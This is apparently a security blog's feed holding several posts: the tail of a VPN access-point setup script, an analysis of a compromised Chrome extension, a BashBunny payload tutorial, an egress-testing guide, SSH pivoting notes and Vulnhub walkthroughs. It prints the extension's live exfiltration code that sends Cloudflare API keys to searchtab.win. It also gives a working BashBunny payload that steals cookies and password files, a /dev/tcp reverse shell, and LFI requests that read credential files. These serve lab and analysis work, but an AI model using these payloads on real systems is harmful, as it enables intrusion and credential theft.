<span style="color:#75715e"># This downloads the OVPN files that Openvpn will use to connect to PIA</span>
<span style="color:#75715e"># and extracts them to the root directory</span>
wget -O /root/vpn.zip https://www.privateinternetaccess.com/openvpn/openvpn.zip
unzip /root/vpn.zip -d /root/

<span style="color:#75715e"># Create a systemd unit that starts the tunnel on system start</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/systemd/system/openvpn.service
</span><span style="color:#e6db74">[Unit]
</span><span style="color:#e6db74">Description=OpenVPN connection to PIA
</span><span style="color:#e6db74">Requires=networking.service
</span><span style="color:#e6db74">After=networking.service
</span><span style="color:#e6db74">[Service]
</span><span style="color:#e6db74">User=root
</span><span style="color:#e6db74">Type=simple
</span><span style="color:#e6db74">ExecStart=/usr/sbin/openvpn --config &#34;/root/${ovpn_file}.ovpn&#34; --auth-user-pass /root/up.txt
</span><span style="color:#e6db74">WorkingDirectory=/root
</span><span style="color:#e6db74">[Install]
</span><span style="color:#e6db74">WantedBy=multi-user.target
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Create the auth file for autostarting the VPM tunnel</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /root/up.txt
</span><span style="color:#e6db74">${ovpn_user}
</span><span style="color:#e6db74">${ovpn_pass}
</span><span style="color:#e6db74">FILE</span>
chmod <span style="color:#ae81ff">600</span> /root/up.txt

<span style="color:#75715e"># recognize the changes by reloading the daemon and enable the unit</span>
<span style="color:#75715e">#</span>
systemctl daemon-reload
systemctl enable openvpn.service

<span style="color:#75715e"># Uncomment the setting that allows packet forwarding between network interfaces</span>
<span style="color:#75715e">#</span>
sed -i <span style="color:#e6db74">&#34;/net.ipv4.ip_forward=1/ s/#*//&#34;</span> /etc/sysctl.conf

<span style="color:#75715e"># Configure static addresses for our wireless adapter</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/network/interfaces
</span><span style="color:#e6db74">source-directory /etc/network/interfaces.d
</span><span style="color:#e6db74">auto lo
</span><span style="color:#e6db74">iface lo inet loopback
</span><span style="color:#e6db74">iface eth0 inet manual
</span><span style="color:#e6db74">allow-hotplug ${pi_interface}
</span><span style="color:#e6db74">iface ${pi_interface} inet static
</span><span style="color:#e6db74">    address ${pi_lan}
</span><span style="color:#e6db74">    netmask ${pi_netmask}
</span><span style="color:#e6db74">    network ${pi_network}
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Configure the DHCP server that will give wireless clients an IP</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/dnsmasq.conf
</span><span style="color:#e6db74">interface=${pi_interface}
</span><span style="color:#e6db74">bind-interfaces
</span><span style="color:#e6db74">dhcp-range=${pi_dhcp_range_min},${pi_dhcp_range_max},${pi_netmask},24h
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Exclude the wireless adapter from any dhcp operations performed by the OS</span>
<span style="color:#75715e">#</span>
echo <span style="color:#e6db74">&#34;denyinterfaces </span><span style="color:#e6db74">${</span>pi_interface<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> | tee -a /etc/dhcpcd.conf

<span style="color:#75715e"># Configure the firewall to redirect packets coming from the wireless</span>
<span style="color:#75715e"># adapter to leave through the vpn interface. Deny all but established</span>
<span style="color:#75715e"># connections coming from the tun0 interface. Persist the rules.</span>
<span style="color:#75715e">#</span>
iptables -t nat -A POSTROUTING -s <span style="color:#e6db74">${</span>pi_network<span style="color:#e6db74">}</span>/<span style="color:#e6db74">${</span>pi_cidr<span style="color:#e6db74">}</span> -o tun0 -j MASQUERADE
iptables -A FORWARD -s <span style="color:#e6db74">${</span>pi_network<span style="color:#e6db74">}</span>/<span style="color:#e6db74">${</span>pi_cidr<span style="color:#e6db74">}</span> -o tun0 -j ACCEPT
iptables -A FORWARD -d <span style="color:#e6db74">${</span>pi_network<span style="color:#e6db74">}</span>/<span style="color:#e6db74">${</span>pi_cidr<span style="color:#e6db74">}</span> -m state --state ESTABLISHED,RELATED -i tun0 -j ACCEPT
iptables-save &gt; /etc/iptables/rules.v4

<span style="color:#75715e"># Configure the access point</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/hostapd/hostapd.conf
</span><span style="color:#e6db74">interface=${pi_interface}
</span><span style="color:#e6db74">driver=nl80211
</span><span style="color:#e6db74">ssid=${ap_ssid}
</span><span style="color:#e6db74">hw_mode=g
</span><span style="color:#e6db74">channel=${ap_channel}
</span><span style="color:#e6db74">wmm_enabled=0
</span><span style="color:#e6db74">macaddr_acl=0
</span><span style="color:#e6db74">auth_algs=1
</span><span style="color:#e6db74">ignore_broadcast_ssid=0
</span><span style="color:#e6db74">wpa=2
</span><span style="color:#e6db74">wpa_passphrase=${ap_password}
</span><span style="color:#e6db74">wpa_key_mgmt=WPA-PSK
</span><span style="color:#e6db74">wpa_pairwise=TKIP
</span><span style="color:#e6db74">rsn_pairwise=CCMP
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Point the hostapd daemon to the configuration file</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt;&gt; /etc/default/hostapd
</span><span style="color:#e6db74">DAEMON_CONF=&#34;/etc/hostapd/hostapd.conf&#34;
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Cleanup function that runs when script exits, regardless or exit code</span>
<span style="color:#66d9ef">function</span> <span style="color:#66d9ef">done</span> <span style="color:#f92672">{</span>
  rm /root/vpn.zip
<span style="color:#f92672">}</span>
trap <span style="color:#66d9ef">done</span> EXIT
</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Chrome Extension Steals Cloudflare Api Tokens</title>
            <link>https://ctrl.red/posts/2017/08/chrome-extension-steals-cloudflare-api-tokens/</link>
            <pubDate>Thu, 03 Aug 2017 20:59:56 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2017/08/chrome-extension-steals-cloudflare-api-tokens/</guid>
            <description>Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I quickly began to wonder about the what and how. Several stories exist about how the extension came to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I believe to be, the more nefarious behavior of the extension. Since the extension calls out to an attacker-controlled URL, the payload hosted at that URL could be changed to anything at any time.</description>
            <content type="html"><![CDATA[<p>Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I
quickly began to wonder about the what and how. Several stories exist about how the extension came
to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I
believe to be, the more nefarious behavior of the extension. Since the extension calls out to an
attacker-controlled URL, the payload hosted at that URL could be changed to <em>anything</em> at any time.</p>
<p>At the time of inspection, the code checks to see if the victim is on the Cloudflare domain. If it
is, it starts an XHR request to fetch the users' API token and ships it, along with the victim&rsquo;s
email address, to an attacker-controlled server.</p>
<h2 id="the-code">The Code</h2>
<p>The extension contains code that, upon visiting any site, generates a dynamic URL that changes
daily. It uses an MD5 hash of the current date, using the d-m-yyyy format.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">// tomorrow&#39;s url
https://wd + md5(4-8-2017) + .win/ga.js
https://wdfefe6195a8b014a1cc7d9cf2449d1b50.win/ga.js
</code></pre></div><p>The following payload is fetched on every page that a victim navigates to. The payload is encoded and
minified. Expanding it reveals the following portion:</p>
<pre tabindex="0"><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">if (top['location']['href']['indexOf']('cloudflare.com') &gt; -1) {
  (function () {
    var _0xb2b9x1 = document['createElement']('script');
    _0xb2b9x1['type'] = 'text/javascript';
    _0xb2b9x1['src'] = '//searchtab.win/ga.js';
    var _0xb2b9x2 = document['getElementsByTagName']('script')[0];
    _0xb2b9x2['parentNode']['insertBefore'](_0xb2b9x1, _0xb2b9x2)
  })()
} else {...
</code></pre><p>The first-stage payload checks whether the victim is currently on cloudflare.com. If they are, it
creates a new script tag on the page and sets its source to <code>//searchtab.win/ga.js</code>. This downloads
stage 2 of the payload. If we look, we get the following script:</p>
<pre tabindex="0"><code class="language-javascript.prettyprint" data-lang="javascript.prettyprint">var xmlhttp = new XMLHttpRequest();
xmlhttp.open('GET', 'https://www.cloudflare.com/api/v4/user/api_key', true);
xmlhttp.setRequestHeader(&quot;x-atok&quot;, window.bootstrap.atok);
xmlhttp.onreadystatechange = function() {
  if (xmlhttp.readyState == 4) {
    if(xmlhttp.status == 200) {
      var obj = JSON.parse(xmlhttp.responseText);
      var key = obj.result.api_key;
      console.log(key);
      (new Image).src = '//searchtab.win/ga.php?user=' +
        encodeURIComponent(window.bootstrap.data.user.email) + '&amp;key=' + encodeURIComponent(key);
    }
  }
};
xmlhttp.send(null);
</code></pre><p>This second-stage payload <code>GET</code>s the logged in user&rsquo;s API key then sends it, and the user&rsquo;s email,
along to the <code>searchtab.win</code> domain.</p>
<p>This was clearly a targeted attack against professional Web Developers. Web Developers will
sometimes have access to production accounts on their employer&rsquo;s infrastructure. Though more common
in smaller companies that don&rsquo;t have dedicated DevOps and/or Security teams, it&rsquo;s not impossible
for bigger companies to fall prey.</p>
<p>With a valid API token, attackers could control a company&rsquo;s public-facing infrastructure and
create or modify sub/domains.</p>
<p>We&rsquo;ve currently blocked all outgoing requests to <code>*.win/ga.js</code> and asked our developers to update
to version 0.5 of the Web Developer extension.</p>
]]></content>
        </item>
        
        <item>
            <title>Creating BashBunny Payloads</title>
            <link>https://ctrl.red/posts/2017/04/creating-bashbunny-payloads/</link>
            <pubDate>Sat, 01 Apr 2017 22:08:35 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2017/04/creating-bashbunny-payloads/</guid>
            <description>What is it? The BashBunny is an attack platform that allows attackers to create payloads in Bash. The device can be scripted to enumerate as a HID (keyboard), mass storage, serial, and Ethernet. This enables a multitude of attacks including thing like exfiltrating documents over a network interface or stealing account hashes from locked computers.
Creating a Payload We want to create a payload that allows for easy exfiltration from macOS.</description>
            <content type="html"><![CDATA[<h2 id="what-is-it">What is it?</h2>
<p>The <a href="http://wiki.bashbunny.com/#!index.md">BashBunny</a> is an attack platform that allows attackers to
create payloads in Bash. The device can be scripted to enumerate as a HID (keyboard), mass storage,
serial, and Ethernet. This enables a multitude of attacks including thing like exfiltrating
documents over a network interface or stealing account hashes from locked computers.</p>
<h2 id="creating-a-payload">Creating a Payload</h2>
<p>We want to create a payload that allows for easy exfiltration from macOS. We also don&rsquo;t want to
force the attacker to know the exact path of the files that are to be extracted; we should allow them
to create bash commands whose output returns a list of files that are to be exfilled.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">
# here we set an amber color to the LED so that the 
# attacker knows that the payload has begun executing
LED G R 500

# instruct the BashBunny to enumerate as both a keyboard and
# mass storage on the host computer (masOS)
ATTACKMODE HID STORAGE

# this creates a folder in the BashBunny's loot directory
# that will be used by our payload
mkdir -p /root/udisk/loot/sMacAndGrab

# enter the name of the volume that will be mounted
dev_name=&quot;BASHBUNNY&quot;

# this is a variable that holds the path to which we will instruct
# the target to copy our desired files
lootdir=&quot;\&quot;/Volumes/$dev_name/loot/sMacAndGrab\&quot;&quot;

# in this section, we add files, directories, and unix commands
# which return lists of files. this text will be typed exactly
# in the macOS terminal. Because this is bash, we have to escape 
# bash characters so that they don't evaluate when the script runs, 
# but rather they're seen as simple text.
files_to_copy=(
&quot;\&quot;~/Library/Application Support/Google/Chrome/Default/Cookies\&quot;&quot; # Quote paths with spaces
&quot;~/Dropbox&quot;  # enter entire directories
&quot;\$(grep -lr password ~/Documents)&quot; # get all Documents with the word 'password'
)
</code></pre><p>It&rsquo;s important to remember that this is a bash script and if we don&rsquo;t want symbols like <code>$;|:~</code> to
be evaluated, but rather typed or passed to the victim, they must be escaped with a backslash.</p>
<p>In the second half of the payload, we&rsquo;re defining strings that are going to by typed by the
BashBunny on the victim computer. This is why you&rsquo;ll see it peppered with <code>\\</code></p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">
# these command instruct the BashBunny to act as a keyboard and physically
# type the commands

# Command + Space to launch Spotlight
QUACK GUI SPACE
QUACK DELAY 1000

# Opens the Terminal program
QUACK STRING terminal
QUACK ENTER
QUACK DELAY 4000

# Types a command to compress all of the previously defined files to 
# the previously defined storage location
QUACK STRING tar -cf \$USER.tar.gz ${files_to_copy[*]}\; mv \$USER.tar.gz $lootdir\; killall Terminal
# $lootdir and $files_to_copy are not escaped because we want them expanded to the variables we set
QUACK ENTER

# sync the filesystem to the BashBunny can be safely removed
sync

# let the attacker know that they can remove the BashBunny
LED G
</code></pre><p>And that&rsquo;s that. If one follows the directions in the wiki posted at the beginning of this post for
loading this payload, you have a payload that creates automatic involuntary backups in a matter of
seconds.</p>
<p>I&rsquo;ve submitted the code to the official [Hak5 BashBunny Payload]
(<a href="https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/SmacAndGrab">https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/SmacAndGrab</a>)
repo as the payload sMacAndGrab. Enjoy!</p>
]]></content>
        </item>
        
        <item>
            <title>Finding Your Way Out From Behind Firewalls with Strict Outbound Rules</title>
            <link>https://ctrl.red/posts/2017/02/finding-your-way-out-from-behind-firewalls-with-strict-outbound-rules/</link>
            <pubDate>Tue, 07 Feb 2017 19:44:18 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2017/02/finding-your-way-out-from-behind-firewalls-with-strict-outbound-rules/</guid>
            <description>You&amp;rsquo;ve achieved code execution on a machine, but for some reason your reverse shell isn&amp;rsquo;t pinging you back. Or that wget/tftp command isn&amp;rsquo;t downloading your recon/post-exploitation tools. There&amp;rsquo;s a chance you&amp;rsquo;re dealing with an egress problem. Typical ports that need outboud access are blocked. You try the main ones you can think of (21, 22, 53, 80, 8080, 443), but none of them seem to be connecting. Do you start at 1 and manually test?</description>
            <content type="html"><![CDATA[<p>You&rsquo;ve achieved code execution on a machine, but for some reason your reverse shell isn&rsquo;t pinging you back.
Or that wget/tftp command isn&rsquo;t downloading your recon/post-exploitation tools. There&rsquo;s a chance you&rsquo;re
dealing with an egress problem. Typical ports that need outboud access are blocked. You try the main ones
you can think of (21, 22, 53, 80, 8080, 443), but none of them seem to be connecting. Do you start at 1 and
manually test? NO! The hallmarks of any decent programmer/hacker is laziness. So let&rsquo;s get lazy.</p>
<h2 id="the-concept">The Concept</h2>
<p>There&rsquo;s a few methods to achieve this, but at each of their cores, these 2 things are happening.</p>
<ul>
<li>The attacking machine (66.66.66.66) needs to listen for something on every port.</li>
<li>Your victim machine (23.23.23.23.) needs to try to hit your machine on every port.</li>
</ul>
<h3 id="netcat-and-iptables">netcat and iptables</h3>
<p><strong>For the attacker</strong></p>
<p>Set all ports to redirect to a listener you&rsquo;ve started.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">iface=eth0
ip=66.66.66.66
lport=8080

iptables -t nat -A PREROUTING -i $iface -p tcp --dport 1:65535 -j DNAT --to-destination $ip:$lport
nc -nvlp $lport
</code></pre><p><strong>For the victim machine</strong></p>
<p>*nix:</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for port in (1..1000); do
  echo &quot;Trying $port&quot;
  nc -z -w1 66.66.66.66 $port
done
</code></pre><p>Netcat DOES accept ranges, so the following also works: <code>nc -w1 66.66.66.66 1-1000</code>. I usually find
that the bash loop&rsquo;s logging makes it easier to ID what worked if you walk away for a bit while it
runs.</p>
<h3 id="wireshark">wireshark</h3>
<p>If you have a GUI available on the attacking machine, you can repeat the above scenario, but
substitute the iptables and nc commands for wireshark with a sane filter; something like</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ip.src == 23.23.23.23
</code></pre><p>You should be able to watch the window for incoming packets and determine on which port
the victim machine was able to connect.</p>
<h3 id="egress-buster">egress-buster</h3>
<p>If you&rsquo;ve the ability to get files onto the target machine, the most robust option is
<a href="https://github.com/trustedsec/egressbuster">egress-buster</a>. The readme does a great job explaining
usage, but it&rsquo;s basically the first method, using iptables and python. It consists of two scripts,
a client and a server. It also has an option to automatically start the reverse shell once it finds
an available outgoing part.</p>
]]></content>
        </item>
        
        <item>
            <title>Configuring SSH for Pivoting</title>
            <link>https://ctrl.red/posts/2017/02/configuring-ssh-for-pivoting/</link>
            <pubDate>Thu, 02 Feb 2017 16:32:04 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2017/02/configuring-ssh-for-pivoting/</guid>
            <description>You&amp;rsquo;re on a pentesting engagement and you&amp;rsquo;ve discovered a dual homed machine that allows you access to a subnet you can&amp;rsquo;t access directly from your attack machine. Assuming you&amp;rsquo;ve compromised at least one machine on the initial network, you can use it as a proxy to other machines on the &amp;ldquo;hidden&amp;rdquo; subnet.
The ssh client has an often-overlooked configuration file that resides in your ~/.ssh folder. You can configure things in here that are specific to certain hosts or you can set default configurations for every host.</description>
            <content type="html"><![CDATA[<p>You&rsquo;re on a pentesting engagement and you&rsquo;ve discovered a dual homed machine that allows you access to a subnet
you can&rsquo;t access directly from your attack machine. Assuming you&rsquo;ve compromised at least one machine on the
initial network, you can use it as a proxy to other machines on the &ldquo;hidden&rdquo; subnet.</p>
<p>The ssh client has an often-overlooked configuration file that resides in your <code>~/.ssh</code> folder. You can
configure things in here that are specific to certain hosts or you can set default configurations for every
host. In order to access remote networks, wouldn&rsquo;t it be nice to shorten a command like:</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh -l user -L 127.0.0.1:5432:132.31.321.123:5432 -p 20222 -i ~/.ssh/db/id_rsa remote.server.com
</code></pre><p>to something like:</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh mount_psql
</code></pre><h3 id="ssh-config-file">SSH Config file</h3>
<p>This file has a <em>lot</em> of configuration options, but we&rsquo;re just going to focus on the one&rsquo;s that help us
pivot through 2+ networks.</p>
<p><strong>ControlMaster</strong></p>
<pre><code>Enables the sharing of multiple sessions over a single network connection. 
When set to ''yes'', ssh(1) will listen for connections on a control socket 
specified using the ControlPath argument. Additional sessions can connect 
to this socket using the same ControlPath
</code></pre>
<p><strong>ControlPath</strong></p>
<pre><code>Specify the path to the control socket used for connection sharing as described 
in the ControlMaster section above or the string ''none'' to disable connection 
sharing
</code></pre>
<p><strong>ProxyCommand</strong></p>
<pre><code>Specifies the command to use to connect to the server. The command string extends 
to the end of the line, and is executed with the user's shell. In the command 
string, '%h' will be substituted by the host name to connect and '%p' by the port.
</code></pre>
<p>Ok, so the first two aren&rsquo;t strictly necessary for the pivoting, but subsequent connections to the same host
will just reuse the same authenticated socket, so it&rsquo;s lighting fast.</p>
<p>If you have the passwords for all the machines in your pivot chain, the client should ask you for each of
them, but the whole process is much smoother if you upload keys to each of them. The cool thing about the ssh
config file is that any program that uses ssh on the backend, can also use this file. So if you configure a
server entry called <code>skynet</code>&hellip;</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ssh skynet
scp file.txt skynet:/tmp
rsync -avr skynet ...
ssh-copy-id -i ~/.ssh/id_rsa skynet
</code></pre><p>^ All of those work.</p>
<p>So let&rsquo;s configure our <code>~/.ssh/config</code> file. Let&rsquo;s also assume root login is enabled on all the machines and
that we&rsquo;ve already copied our ssh keys onto the remote machines.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ControlMaster auto
ControlPath /tmp/ssh_mux_%h_%p_%r
ServerAliveInterval 60 

Host first_hop
  Hostname 123.123.321.123
  User root
  IdentityFile ~/.ssh/id_rsa

Host second_hop
  Hostname 321.321.345.345
  User root
  IdentityFile ~/.ssh/id_rsa
  ProxyCommand ssh -w %h:%p first_hop

Host skynet
  Hostname 666.666.666.666
  User root
  IdentityFile ~/.ssh/id_rsa
  ProxyCommand ssh -w %h:%p second_hop
</code></pre><p>With this configuration, we&rsquo;re able to connect to <code>skynet</code>, which is 2 subnets removed from our current one,
with the command <code>ssh skynet</code>. Likewise, if we want to create a dynamic tunnel to allow for <code>proxychains</code>
usage, <code>ssh -fNTD 9050 skynet</code> should do the trick. Then <code>proxychains nmap...</code> to your hearts content!</p>
<p>The ProxyCommand directive in <code>skynet</code> is, in a way, declaring a prerequisite ssh connection to <code>second_hop</code>.
The <code>-w</code> flag states that the client should just go ahead and forward and STDIN/OUT through the next
connection.</p>
<p>That&rsquo;s it. Go forth and PIVAAAT!</p>
<p><img src="https://az616578.vo.msecnd.net/files/2016/07/16/636042357012300047-1231186684_ross-pivot-friends.gif" alt=""></p>
<p><strong>Additional Resources:</strong></p>
<p><a href="https://linux.die.net/man/5/ssh_config">SSH Client Configurations Docs</a></p>
]]></content>
        </item>
        
        <item>
            <title>B2R: Wallaby Walkthrough</title>
            <link>https://ctrl.red/posts/2016/12/b2r-wallaby-walkthrough/</link>
            <pubDate>Fri, 30 Dec 2016 19:16:02 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2016/12/b2r-wallaby-walkthrough/</guid>
            <description>Executive Summary This machine had an unlisted but open webapp path that allowed for remote command execution. After establishing a reverse shell as the limited user www-data, privilege checks showed the user was allowed to modify firewall rules. There was also an IRC server that contained a bot that allowed command execution through the use of the .run command. The command would only obey the user waldo so modification of the firewall allows an attacker to kick and assume the waldo identity.</description>
            <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
<p>This machine had an unlisted but open webapp path that allowed for remote command execution. After
establishing a reverse shell as the limited user <code>www-data</code>, privilege checks showed the user was allowed to
modify firewall rules. There was also an IRC server that contained a bot that allowed command execution
through the use of the <code>.run</code> command. The command would only obey the user <code>waldo</code> so modification of the
firewall allows an attacker to kick and assume the <code>waldo</code> identity. Now the <code>.run</code> command could be run and
a reverse shell with the user <code>wallaby</code> could be established. <code>wallaby</code> had password-less sudo access, so
elevating to the root user was trivial.</p>
<h2 id="tools-used">Tools Used</h2>
<ul>
<li>nmap - service enumeration</li>
<li>uniscan - webapp scanner</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Upon enumerating available services with nmap, I discovered two ports, 22 and 80. I began to scan with
<code>uniscan</code> but this failed and caused the VM to move the web application to a different port. It appeared that
automated tools were going to make this challenge harder, not easier.</p>
<p>After another scan, we find our new port:</p>
<p><img src="https://i.imgur.com/U7eKOCh.png" alt="">
<img src="https://i.imgur.com/xuPADKd.png" alt=""></p>
<p>Various sorts of manual testing gave us different messages:</p>
<p><img src="https://i.imgur.com/WwMxNnj.png" alt="">
<img src="https://i.imgur.com/IS2BlBh.png" alt=""></p>
<p>At this point, I decided to automate my enumeration of pages with a custom script.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">for word in $(cat /usr/share/dirb/wordlists/common.txt); do
    
    # find pages whose last line does NOT contain the phrase 'what are you trying' ( a 404, essentially )
    curl -q &quot;vm:60080/?page=$word&quot; 2&gt;/dev/null | tail -1 | grep -v 'what are you trying'

    if [[ $? -eq 0 ]]; then
        #if the last command command completed succesfully, print the word we foun
        echo $word
    fi
done | grep -v &quot;/&quot; # don't print results with slashes in them, they're false positives
</code></pre><p>This output yielded the pages.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">contact
mailer
home
index
blacklist
name
</code></pre><p>The most interesting page here was <code>mailer</code>:</p>
<p><img src="https://i.imgur.com/TNJEtuI.png" alt=""></p>
<p>I attempted to see if the <code>mail</code> query parameter actually passed through as a system command. It did:</p>
<p><img src="https://i.imgur.com/9Yu6Zky.png" alt=""></p>
<p>From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the <code>mail</code>
query parameter:</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.177/443 0&gt;&amp;1&quot;

# becomes

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.177%2F443%200%3E%261%22
</code></pre><p><img src="https://i.imgur.com/tWhvBSP.png" alt=""></p>
<p>Enumerating this user&rsquo;s privileges and networking, we determine that we have control of firewall rules,
there&rsquo;s a rule blocking incoming requests to port 6667, and that there&rsquo;s an IRC server running locally.</p>
<p><img src="https://i.imgur.com/1slTkmg.png" alt=""></p>
<p><img src="https://i.imgur.com/uxK21ov.png" alt=""></p>
<p>We can clear the firewall rules with <code>sudo iptables -F</code> and connect to the IRC server from the attacking
machine.</p>
<p><img src="https://i.imgur.com/b0NDIKS.png" alt=""></p>
<p><img src="https://i.imgur.com/IoX9DnK.png" alt=""></p>
<p>If we try to run the <code>.run</code> command, <code>wallabysbot</code> refuses.</p>
<p><img src="https://i.imgur.com/R5Vwo3f.png" alt=""></p>
<p>The code for the and configs for the bot are located in <code>/home/wallaby/.sopel</code> and it indicates that we need
to assume the nickname <code>waldo</code> in order for us to be able to use this command. We can&rsquo;t do that while waldo
is still logged in so we boot them off with the use of our firewall.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
</code></pre><p><img src="https://i.imgur.com/KCH7TX6.png" alt=""></p>
<p>In a while, after a timeout, only <code>waldo</code> should be ejected from the room, leaving the ability to steal his
nick and command the bot.</p>
<p><img src="https://i.imgur.com/1TnwYcT.png" alt=""></p>
<p>With a reverse shell established, we can see that the wallaby user has full, passwordless <code>sudo</code> access. From
here, it&rsquo;s just one command to <code>root</code></p>
<p><img src="https://i.imgur.com/Ds0KVYg.png" alt=""></p>
<p>Thanks to Waldo and Vulnhub for this frustrating but entertaining VM!</p>
<h2 id="additional-information">Additional Information</h2>
<ul>
<li>User <code>waldo</code> is running irssi within a tmux session. The socket is located in <code>/tmp/tmux-1000</code></li>
<li>There exists an irssi DoS vulnerability that could have been used to boot the <code>waldo</code> user to assume
control of the bot.</li>
<li>The <code>.py</code> modules (which runs python commands), at the time of this writing makes an external call to an
out-of-scope API. It does not run the python command on the target machine.</li>
<li>There are at least 3 ways to get a limited shell and at least 2 to get root.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>B2R: Stapler</title>
            <link>https://ctrl.red/posts/2016/12/b2r-stapler/</link>
            <pubDate>Sat, 24 Dec 2016 23:45:38 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2016/12/b2r-stapler/</guid>
            <description>Adding the IP address of the VM to the hosts file allows one to cut down on some typing.
Executive Summary This machine had several services running, some of which revealed employee names and accounts that could later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script ran every 20 minutes as the root user and that the script was writable to our non-privileged user.</description>
            <content type="html"><![CDATA[<p>Adding the IP address of the VM to the hosts file allows one to cut down on some typing.</p>
<p><img src="https://i.imgur.com/cazlgnf.png" alt=""></p>
<h2 id="executive-summary">Executive Summary</h2>
<p>This machine had several services running, some of which revealed employee names and accounts that could
later be leveraged to compromise the system. A Wordpress plug-in vulnerability was found and used to extract
database credentials, which then led to a non-privileged shell. Once scanned, it was discovered that a script
ran every 20 minutes as the <code>root</code> user and that the script was writable to our non-privileged user. This was
leveraged to create a <code>root</code> shell by replacing the file contents with a malicious payload.</p>
<h2 id="execution">Execution</h2>
<p>An initial recon scan on the target revealed the following services:</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; onetwopunch -t ip_addresses.txt -p tcp
</code></pre><p><img src="https://i.imgur.com/YeosV0b.png" alt=""></p>
<p>All together, individual inspection of the services revealed a plethora of information about the company and
its employees.
This section will cover the most direct route to <code>root</code>,
but see the <a href="#additional-discovery">Additional Discovery</a> section for that information.</p>
<p>Using <code>nikto</code> against the service on port <code>12380</code> revealed additional paths using the https protocol.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; nikto -host vm:12380
</code></pre><p><img src="https://i.imgur.com/DTF5i00.png" alt=""></p>
<p>The site hosted at <code>/blogblog</code> is a Wordpress blog with a vulnerable plug-in, as discovered by <code>wpscan</code>.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">wpscan -u https://vm:12380/blogblog/
</code></pre><p><img src="https://i.imgur.com/uzdO1dx.png" alt="">
<img src="https://i.imgur.com/U2NyDnu.png" alt="">
<img src="https://i.imgur.com/LrEOKFq.png" alt=""></p>
<p><a href="https://www.exploit-db.com/exploits/39646/">This LFI vulnerability</a> allows an attacker to read the contents
of a file on the system by using that file as a &ldquo;thumbnail&rdquo; for a post. An attacker could use this to read
the contents of the Wordpress configuration file which has database credentials. The user account list for
this machine was also acquired using this method.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../../../../../etc/passwd&quot;
&gt;&gt; curl -k &quot;https://vm:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=9898092807434134&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&quot;
</code></pre><p><img src="https://i.imgur.com/XMcARrC.png" alt=""></p>
<p>By curling the &ldquo;image&rdquo; urls, the contents can be read.</p>
<p><img src="https://i.imgur.com/CVtnKiK.png" alt="">
<img src="https://i.imgur.com/rfez3zi.png" alt=""></p>
<p>With credentials and an open 3306 port, an attacker can log in and create a malicious file that would allow
remote code execution.</p>
